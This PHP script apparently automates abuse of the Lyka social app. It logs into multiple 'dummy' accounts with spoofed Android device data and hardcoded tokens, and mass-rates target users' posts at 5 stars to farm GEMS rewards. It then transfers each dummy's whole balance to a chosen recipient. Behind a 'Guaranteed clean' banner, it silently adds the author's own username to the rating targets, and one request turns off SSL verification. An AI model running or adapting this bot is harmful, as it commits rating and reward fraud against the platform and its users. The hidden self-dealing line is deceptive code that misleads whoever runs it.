<?php @system("clear");
// RATEIT
/*
# Regular Colors
Black="\[\033[0;30m\]"        # Black
Red="\[\033[0;31m\]"          # Red
Green="\[\033[0;32m\]"        # Green
Yellow="\[\033[0;33m\]"       # Yellow
Blue="\[\033[0;34m\]"         # Blue
Purple="\[\033[0;35m\]"       # Purple
Cyan="\[\033[0;36m\]"         # Cyan
White="\[\033[0;37m\]"        # White


# Bold
BBlack="\[\033[1;30m\]"       # Black
BRed="\[\033[1;31m\]"         # Red
BGreen="\[\033[1;32m\]"       # Green
BYellow="\[\033[1;33m\]"      # Yellow
BBlue="\[\033[1;34m\]"        # Blue
BPurple="\[\033[1;35m\]"      # Purple
BCyan="\[\033[1;36m\]"        # Cyan
BWhite="\[\033[1;37m\]"       # White
*/

//Set font color

$BWhite   =  "\033[1;37m" ;
$Cyan     =  "\033[0;36m" ;
$Yellow   =  "\033[0;33m" ;
$CyanBold =  "\033[1;36m" ;
$White    =  "\033[0;37m" ;

echo "$CyanBold";
echo "\n\n       #LYKA\n";
echo "     Rate my Post Script\n";
echo "   Optional sending of GEMS\n";
echo "\n";
echo "       Guaranteed clean.\n";
echo "\n";


//init dummy array
$usernamearray = []; 
//$passarray=[];

echo "Input the usernames (aka dummy)\nyou are using to rate.\n";
echo "Enter (blank) to skip\n";
do {
   $username = readline('Username : ');
  if ($username !='') {
   array_push($usernamearray, "$username",);
   }
//   $pass = readline('dummy password:' );
//   array_push($passarray,"$pass");
} while ($username !='');

//should use one password per dummy account
$pass=readline('Enter password: ');

echo "$Yellow\n";

//get acct names to rate
$accounts=[];
echo "\nInput all the accounts\nyou wish to autorate\n";
echo "Enter (blank) to skip.\n";
 do {
    $accountName=readline('Username to rate : ');
  if ($accountName !='') {  
  array_push($accounts,"$accountName");
  }

} while ($accountName !='');

//array_push($accounts,"maximum001"); //attach my own username
array_push($accounts,"shib_aparri"); //attach my own username

//get the account where the harvested gems will be sent
echo "\nInput the recipient of GEMS.\n";
echo "or blank if you don't want to transfer\n";
$GEMReceiver=readline('Username : ');

echo "\nprogram is setting up...\n\n";

foreach ($usernamearray as $user) {

    //Login to dummy account
    $urll = "https://identity.mylykaapps.com/useraccounts/login";
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_URL, $urll);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    $headerss = array("Content-Type: application/json", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)");
    curl_setopt($curll, CURLOPT_HTTPHEADER, $headerss);
    $DeviceInfo = <<<DATA
    {
    "countryCode": "US",
    "device": {
    "deviceId": "fcbe87b62342fbac",
    "deviceImei": "fcbe87b62342fbac",
    "deviceModel": "Tecno Spark 7 Pro",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
    "osVersion": "28"
  },
  "password": "$pass",
  "username": "$user"
}
DATA;

    curl_setopt($curll, CURLOPT_POSTFIELDS, $DeviceInfo);
    $respp = curl_exec($curll);
    curl_close($curll);
    $jsonn = json_decode($respp);
    $msgn = $jsonn->message;
    $status = $jsonn->status;
    $vuser = $jsonn->data->username;
    $bearer = $jsonn->data->token->accessToken;
    $json = json_decode($respp);  

    if ($status == 0) {
      echo "$user error logging to dummy account.\n";
      //echo "program will terminate.\n";  
      //exit; 
    }

  //loop only when logged successfully
  if ($status == 1) {

    echo "$Cyan\n";
    echo "$user login successful\n";
  
    //Get current balance of dummy
    $urlbal = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $curlbal = curl_init($urlbal);
    curl_setopt($curlbal, CURLOPT_URL, $urlbal);
    curl_setopt($curlbal, CURLOPT_RETURNTRANSFER, true);   
    $headersbal = array("authorization: Bearer $bearer",);
    curl_setopt($curlbal, CURLOPT_HTTPHEADER, $headersbal);
    $respbal = curl_exec($curlbal);
    curl_close($curlbal);
  
    $jsonbal = json_decode($respbal);
    $tg = $jsonbal->data->totalGem;
    echo "This is your current balance\n";
    echo "$user balance : $tg GEMS\n\n";
    
    //echo "No balance will be transferred to any account.\n\n";
    //
    
    foreach($accounts as $mainacct) {
      
      echo "$White\n";
      echo "connecting to\n[$mainacct]...\n";
  
      echo "$Cyan";
  
      $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$mainacct&os=android&pageIndex=1&pageSize=16";
      $curlm = curl_init($urlm);
      curl_setopt($curlm, CURLOPT_URL, $urlm);
      curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
      $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
      curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
      $respm = curl_exec($curlm);
      curl_close($curlm);

      $jsonm = json_decode($respm, true);
      $uid = $jsonm["data"]["0"]["id"];
      $vvuser = $jsonm["data"]["0"]["userName"];

      //Found the username
      if ($mainacct == $vvuser) {

        echo "Connected to [$mainacct]\n";

        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$uid&category=ALL";
        $curld = curl_init($urld);
        curl_setopt($curld, CURLOPT_URL, $urld);
        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
        $respd = curl_exec($curld);
        curl_close($curld);
        $jsond = json_decode($respd, true);
  
        $arr = json_decode($respd, true);
        $p[1] = $arr["data"]["0"]["id"];
        $p[2] = $arr["data"]["1"]["id"];
        $p[3] = $arr["data"]["2"]["id"];
        $p[4] = $arr["data"]["3"]["id"];
        $p[5] = $arr["data"]["4"]["id"];
        $p[6] = $arr["data"]["5"]["id"];
        $p[7] = $arr["data"]["6"]["id"];
        $p[8] = $arr["data"]["7"]["id"];
        $p[9] = $arr["data"]["8"]["id"];
        $p[10] = $arr["data"]["9"]["id"];
        $p[11] = $arr["data"]["10"]["id"];
  

    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
  
//RATING posts
   echo "Max rating posts...\n";
for ($postloop=1; $postloop<12; $postloop++) {   

  echo "Post # $postloop \n";
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_URL, $url);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
  $data = <<<DATA
{
  "device": {
  "deviceId": "fcbe87b62342fbac",
  "deviceImei": "fcbe87b62342fbac",
  "deviceModel": "Tecno Spark 7 Pro",
  "deviceName": "android",
  "deviceOs": "Android O_MR1 ",
  "isEmulator": false,
  "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
  "osVersion": "28"
  },
  "postId": $p[$postloop],
  "rate": 5,
  "userid": $uid
}
DATA;
  curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
  $resp = curl_exec($curl);
  curl_close($curl);
  //var_dump($resp);
  $json = json_decode($resp);
  echo "$Yellow"; 
  echo $json->message; 
  echo "$Cyan\n";

          } //end of for..loop
          } else { 
            echo "\nfailed to connect to $mainacct\n\n"; 
          }
          //end of mainacct=vvuser
     
      } //end of foreach username  
  } //end of status==1  

  echo "Posts rating done\n\n";
  
  echo "$BWhite\n\n";
  echo "Retrieving $user updated balance\n\n";

  echo "$Cyan";
   
    $urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $curlbal2 = curl_init($urlbal2);
    curl_setopt($curlbal2, CURLOPT_URL, $urlbal2);
    curl_setopt($curlbal2, CURLOPT_RETURNTRANSFER, true);
    $headersbal2 = array("authorization: Bearer $bearer",);
    curl_setopt($curlbal2, CURLOPT_HTTPHEADER, $headersbal2);
    //for debug only!
    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYPEER, false);
    $respbal2 = curl_exec($curlbal2);
    curl_close($curlbal2);
    //var_dump($respbal);
    $jsonbal2 = json_decode($respbal2);
    $tg2 = $jsonbal2->data->totalGem;
    echo "New balance is $tg2 GEMS\n\n";

   if ($GEMReceiver !='') {
    echo "Verifying the recipient $GEMReceiver...\n";
    //echo "No sending of GEMS to any account\n";
    //echo "Pls. perform manual sending if needed.\n";
    
    $urlx = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$GEMReceiver&os=android&pageIndex=1&pageSize=16";
      $curlx = curl_init($urlx);
      curl_setopt($curlx, CURLOPT_URL, $urlx);
      curl_setopt($curlx, CURLOPT_RETURNTRANSFER, true);
      $headersx = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
      curl_setopt($curlx, CURLOPT_HTTPHEADER, $headersx);
      $respx = curl_exec($curlx);
      curl_close($curlx);

      $jsonx = json_decode($respx, true);
      $uidx = $jsonx["data"]["0"]["id"];
      $usernamex = $jsonx["data"]["0"]["userName"];
    
    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
    $curlbals = curl_init($urlbals);
    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
    curl_setopt($curlbals, CURLOPT_POST, true);
    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
    $databals = '{"amount":"' . $tg2 . '","device":{"deviceId":"f606c43d78f50669","deviceImei":"f606c43d78f50669","deviceModel":"Tecno Spark 7 Pro","deviceName":"android","deviceOs":"Android O_MR1","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . $uidx . '}';
    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
    $respbals = curl_exec($curlbals);
    curl_close($curlbals);
    //var_dump($respbals);

    $jsonbals = json_decode($respbals);
    echo $jsonbals->message;
    echo "\n";
    echo "$user GEMS transferred to . $GEMReceiver . : +$tg2 GEMS   ";  
    echo "\n\n";
   } else {
    echo "Receiver not defined, no GEMS was transferred.\n";

   }
  

  } //end of loop for each dummy


  //rene_wolverine uid = 700002814478

    echo "$BWhite";
    echo "\nDone. Thank you!\n\n";
